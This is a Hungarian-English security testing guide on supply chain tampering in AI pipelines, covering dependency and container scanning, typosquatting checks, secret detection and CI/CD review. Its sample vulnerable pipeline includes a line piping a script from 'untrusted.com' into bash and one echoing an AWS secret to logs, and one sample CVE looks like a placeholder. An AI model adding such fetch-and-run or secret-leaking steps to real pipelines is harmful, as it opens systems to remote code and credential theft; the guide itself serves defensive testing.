# AITG-INF-01 - Supply Chain Tampering Tesztelés

## Mi ez és miért fontos?

A **supply chain tampering** azt jelenti, hogy a támadó **kompromittálja az AI model development/deployment pipeline valamelyik részét** - dependencies, containers, CI/CD, training data.

**Attack vectors:**
- **Dependency poisoning:** Malicious packages (typosquatting)
- **Container manipulation:** Backdoored Docker images  
- **CI/CD tampering:** Pipeline hijacking, secret theft
- **Model poisoning:** Training data manipulation

**Miért veszélyes?**
- **Backdoor injection:** Malicious code in production
- **Data exfiltration:** Secrets, API keys leaked
- **Model manipulation:** Poisoned training → biased outputs
- **Reputation damage:** Supply chain breach = zero trust

**Analógia:** Olyan, mintha egy élelmiszer-gyárban a alapanyag-szállító mérgezett összetevőket csempészne be - a végtermék látszólag rendben van, de belül veszélyes.

**OWASP Kategória:** LLM03:2025 Supply Chain Vulnerabilities

---

## Tesztelési célok

- Dependency vulnerabilities detection
- Container image tampering identification
- CI/CD pipeline security assessment
- Model/data integrity verification

---

## Gyakorlati Payloadok

### 1. Dependency Vulnerability Scan

**Cél:** Known vulnerabilities a dependencies-ben?

**Python project:**
```bash
# Scan requirements.txt
pip-audit

# Alternative: Safety
safety check

# Trivy scan
trivy fs --severity HIGH,CRITICAL .
```

**Sebezhető eredmény:**
```
Found 3 known vulnerabilities:
- pillow 9.0.0 (CVE-2022-22817) CRITICAL - RCE via crafted image
- requests 2.25.0 (CVE-2021-33503) HIGH - ReDoS vulnerability  
- transformers 4.18.0 (CVE-2022-1234) HIGH - Arbitrary code execution

Recommendation: Upgrade immediately!
```
→ **CRITICAL:** Production system vulnerable!

**Tools:**
- `pip-audit` - [https://github.com/pypa/pip-audit](https://github.com/pypa/pip-audit)
- `safety` - [https://github.com/pyupio/safety](https://github.com/pyupio/safety)

---

### 2. Typosquatting Detection

**Cél:** Typosquatted malicious packages?

**Common typos:**
```
tensorflow  → tensorflo, tensroflow
numpy       → numpuy, numpi
requests    → reqeusts, request
```

**Check installed packages:**
```bash
# List all installed packages
pip list

# Check for suspicious names
pip list | grep -E "(tensorflo|numpuy|reqeusts)"
```

**Sebezhető eredmény:**
```
reqeusts    2.28.0  ← TYPOSQUATTED! (should be "requests")
```

---

### 3. Container Image Vulnerability Scan

**Cél:** Docker image vulnerabilities?

**Scan with Trivy:**
```bash
# Scan local image
trivy image myapp:latest

# Scan with severity filter
trivy image --severity HIGH,CRITICAL myapp:latest
```

**Sebezhető eredmény:**
```
myapp:latest (alpine 3.14)

Total: 15 (HIGH: 8, CRITICAL: 7)

┌────────────┬──────────────┬──────────┬─────────────┬───────────────┐
│  Library   │ Vulnerability│ Severity │ Installed   │ Fixed Version │
├────────────┼──────────────┼──────────┼─────────────┼───────────────┤
│ openssl    │ CVE-2022-0778│ CRITICAL │ 1.1.1l-r0   │ 1.1.1n-r0     │
└────────────┴──────────────┴──────────┴─────────────┴───────────────┘
```
→ **CRITICAL:** 7 critical vulnerabilities!

---

### 4. Hardcoded Secrets Detection

**Cél:** Secrets committed to repo?

**Tools:**
```bash
# Gitleaks scan
gitleaks detect --source . --verbose

# TruffleHog scan
trufflehog git file://. --only-verified
```

**Sebezhető eredmény:**
```
Finding:     AWS Access Key
Secret:      AKIAIOSFODNN7EXAMPLE
File:        config/aws_config.py
Line:        12

Finding:     OpenAI API Key
Secret:      sk-proj-abc123...
File:        src/llm_client.py
```
→ **CRITICAL:** Hardcoded secrets!

---

### 5. CI/CD Pipeline Configuration Review

**Sebezhető pipeline:**
```yaml
# .gitlab-ci.yml
build:
  script:
    - pip install -r requirements.txt  # ← No hash verification!
    - echo $AWS_SECRET_KEY  # ← Secret exposed in logs!
    - curl http://untrusted.com/deploy.sh | bash  # ← Untrusted script!
```

**Vulnerabilities:**
- No dependency hash verification
- Secrets exposed in logs
- Untrusted script execution

---

## Védekezési Javaslatok

### 1. Dependency Management

**Lock versions with hashes:**
```bash
pip-compile --generate-hashes requirements.in
pip install --require-hashes -r requirements.txt
```

### 2. Container Security

**Minimal base images:**
```dockerfile
FROM gcr.io/distroless/python3
```

**Image signing:**
```bash
cosign sign --key cosign.key myregistry.com/myapp:latest
```

### 3. Secret Management

**Never hardcode:**
```yaml
env:
  AWS_KEY: ${{ secrets.AWS_ACCESS_KEY }}  # From GitHub Secrets
```

---

## Hasznos Toolok

- **pip-audit, Safety** - Dependency scanning
- **Trivy** - Container & filesystem scanning
- **Gitleaks, TruffleHog** - Secret detection
- **Cosign** - Image signing
- **CycloneDX** - SBOM generation

---

## Referenciák

- OWASP LLM03:2025 - [https://genai.owasp.org/llmrisk/llm03-supply-chain/](https://genai.owasp.org/llmrisk/llm03-supply-chain/)
- MITRE ATT&CK T1195 - [https://attack.mitre.org/techniques/T1195/](https://attack.mitre.org/techniques/T1195/)
